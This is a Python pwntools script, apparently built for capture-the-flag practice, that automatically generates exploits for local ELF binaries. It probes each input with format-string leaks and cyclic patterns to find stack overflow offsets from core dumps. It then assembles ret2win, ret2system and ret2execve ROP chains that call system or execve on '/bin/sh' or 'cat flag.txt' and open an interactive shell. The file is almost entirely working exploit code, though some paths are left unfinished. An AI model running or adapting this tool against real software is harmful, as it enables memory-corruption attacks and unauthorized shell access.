from pwn import *
import os, subprocess, re, sys

class AEG:
	def __init__(self, filepath):
		self.file = filepath
		self.elf = ELF(filepath)
		self.rop = ROP(self.elf)
		self.funcs = self.elf.sym.keys()

	def analyze_funcs(self):
		print('ANALYZING FUNCTIONS...')
		# Check for tell of a ROP problem - presence of a symbol named gadget
		self.has_gadget = False
		self.has_printf = False
		self.can_overflow = False
		self.can_leak = False
		#self.has_win = False
		for f in self.funcs:
			srch = re.search(r"gadget", f)
			if srch != None:
				print('Found a hardcoded gadget:', f)
				self.has_gadget = True
			if f == 'printf':
				print('Found a call to printf:', f)
				self.has_printf = True
			if f == 'gets':
				#print('Found a win() function:', f)
				self.can_overflow = True

	# Look at Input/Output 
	def analyze_IO(self):
		p = process(self.file)
		self.num_inputs = 0
		self.input_exploits = dict()
		# This will find number of inputs, and look for any printf leaks
		while(p.poll() == None):
			if p.can_recv(timeout=1):
				try:
					line = p.recv().decode()
				except EOFError:
					continue
				srch = re.search(r'0x[0-9a-f]+', line)
				if srch != None:
					print(f'Leak Found!: {line}')
					self.can_leak = True
					i = self.num_inputs
					# Record that this input can be attacked with print format bug
					if i in self.input_exploits.keys():
						self.input_exploits[i].append('leak')
					else:
						self.input_exploits[i] = ['leak']
						
				
			else:
				self.num_inputs += 1
				if self.has_printf:
					p.sendline('%p %p %p')
				else:
					p.sendline('a')
		
		#print(self.input_exploits)

		# Now check for buffer overflows on each input
		for i in range(self.num_inputs):
			p.close()
			p.kill()
			p = process(self.file)
			curr_input = 0
			checked_input = False
			while p.poll() == None and checked_input==False:
				
				if p.can_recv(timeout=1):
					try:
						p.recv()
					except EOFError:
						continue
				else:
					# Only test one input at a time
					if curr_input != i:
						p.sendline('a')
						curr_input += 1
					else:
						checked_input = True
						# Send in cyclic pattern and check for overflow
						p.sendline(cyclic(1024, n=8))
						p.wait()
						core = p.corefile
						p.close()
						if core == None:	# No core dump means no overflow
							continue
						os.remove(core.file.name)
						padding = cyclic_find(core.read(core.rsp, 8), n=8)
						if padding == -0x1:
							# If rsp didn't give us the overflow for whatever reason, check rbp
							padding = cyclic_find(core.read(core.rbp, 8), n=8) # + 8
							# If padding is still -0x1, then there is no overflow on this input
							if padding == -0x1:
								continue
							else:
								padding += 8	# add 8 to increment from rbp to return address
						# If we reach here, we found an overflow
						j = i+1
						if j in self.input_exploits.keys():
							self.input_exploits[j].append(f'overflow:{padding}')
						else:
							self.input_exploits[j] = [f'overflow:{padding}']
		#print(self.input_exploits)
		p.close()
		p.kill()				

		
	# This function will use all the information we gathered to determine which exploit to call
	def determine_exploit(self):
		self.exploit = b''
		# If only one input
		if self.num_inputs == 1:
			# Get overflow amount
			for attack in self.input_exploits[1]:
				srch = re.search(r'overflow:([0-9]+)', attack)
				if srch != None:
					padding = int(srch.group(1))
					# ret2win problem
					if 'win' in self.funcs:
						log.info('ret2win exploit')
						self.ret2win(1, padding)

					# ret2system problem
					elif 'system' in self.funcs:
						log.info('ret2system exploit')
						self.ret2system(1, padding)

					# craft an execve problem
					elif 'execve' in self.funcs:
						log.info('ret2execve exploit')
						self.ret2execve(1, padding)

	# ret2win exploit generator
	def ret2win(self, vuln_input, padding):
		p = process(self.file)
		curr_input = 1
		# Craft the exploit
		exploit = b'a'*padding + p64(self.elf.sym['win'])
		while p.poll() == None:
			if p.can_recv(timeout=1):
				try:
					p.recv()
				except EOFError:
					continue
			else:
				if curr_input == vuln_input:
					p.sendline(exploit)
					p.interactive()
				else:
					p.sendline('a')
					curr_input += 1
		# Terminate process
		p.close()
		p.kill()

	# ROP exploit where we call system('/bin/sh') or system('cat flag.txt')
	def ret2system(self, vuln_input, padding):
		log.info('crafting exploit')
		p = process(self.file)
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = -1
		is_binsh = len(list(self.elf.search(b'/bin/sh\x00')))
		is_catflag = len(list(self.elf.search(b'cat flag.txt\x00')))
		if is_binsh > 0:
			targ_str = next(self.elf.search(b'/bin/sh\x00'))
		elif is_catflag > 0:
			targ_str = next(self.elf.search(b'cat flag.txt\x00'))

		# If we found one of these strings, we don't need to make it. Look for pop_rdi gadget
		if targ_str != -1:
			pop_rdi = self.rop.find_gadget(['pop rdi', 'ret'])[0]
			if pop_rdi:
				exploit = b'a'*padding + p64(pop_rdi) + p64(targ_str) + p64(self.elf.sym['system'])
		else:
			print('Work on mov gadget later')
			return
		# Now that exploit has been crafted, go through program and leverage exploit at correct time
		curr_input = 1
		while p.poll() == None:
			print(p.poll())
			if p.can_recv(timeout=1):
				try:
					p.recv()
					print('we are here')
				except EOFError:
					print('eoferror')
					return
			else:
				if curr_input == vuln_input:
					p.sendline(exploit)
					p.interactive()
					p.close()
					p.kill()
					return
				else:
					p.sendline('a')
					curr_input += 1
		# Terminate process
		p.close()
		p.kill()
			
	# ROP exploit where we call execve('/bin/sh', 0, 0) or execve('cat flag.txt', 0, 0)				
	def ret2execve(self, vuln_input, padding):
		log.info('CRAFTING EXPLOIT')
		# Search for '/bin/sh' or 'cat flag.txt' in our binary
		targ_str = -1
		is_binsh = len(list(self.elf.search(b'/bin/sh\x00')))
		is_catflag = len(list(self.elf.search(b'cat flag.txt\x00')))
		if is_binsh > 0:
			targ_str = next(self.elf.search(b'/bin/sh\x00'))
		elif is_catflag > 0:
			targ_str = next(self.elf.search(b'cat flag.txt\x00'))

		# If we found the target string, don't have to make it. Find pop rdi, pop rsi, and pop rdx gadgets
		if targ_str != -1:
			try:
				pop_rdi = p64(self.rop.find_gadget(['pop rdi', 'ret'])[0])
				pop_rsi = p64(self.rop.find_gadget(['pop rsi', 'ret'])[0])
				pop_rdx = p64(self.rop.find_gadget(['pop rdx', 'ret'])[0])
				exploit = b'a'*padding + pop_rdi + p64(targ_str) + pop_rsi + p64(0) + pop_rdx + p64(0)
				exploit += p64(self.elf.sym['execve'])
				print('execve exploit made')
			except:
				print("Couldn't get gadgets")
		# TODO - account for having to write to memory
		else:
			print('Work on mov gadget later')
		# Now that exploit has been crafted, go through program and leverage exploit at correct time
		curr_input = 1
		sent = False
		p = process(self.file)
		while p.poll() == None:
			print(p.poll())
			if p.can_recv(timeout=1):
				try:
					p.recv()
					print('we are here')
				except EOFError:
					print('eoferror')
					return
			else:
				if curr_input == vuln_input:
					p.sendline(exploit)
					p.interactive()
					p.close()
					p.kill()
					return
				else:
					p.sendline('a')
					curr_input += 1
		p.close()
		p.kill()
		

	def get_analysis(self):
		print(f'ROP: {self.has_gadget}')
		print(f'String format bug: {self.has_printf}')
		print(f'Number of inputs: {self.num_inputs}')
		print(f'Input Attack Vectors: {self.input_exploits}')
		#print(f'Ret2Win exploit: {self.is_ret2win}')
	
	def send_exploit(self):
		p = process(self.file)
		p.recv()
		p.sendline(self.exploit)
		p.interactive()
		p.close()
		p.kill()

try:
	solver = AEG(args.BIN)

except FileNotFoundError:
	print("FileNotFoundError")
	print('Pass in a binary to exploit: python3 solarpanth3r.py BIN=<binary>')
	sys.exit()

solver.analyze_funcs()
solver.analyze_IO()
solver.get_analysis()
solver.determine_exploit()
#solver.send_exploit()

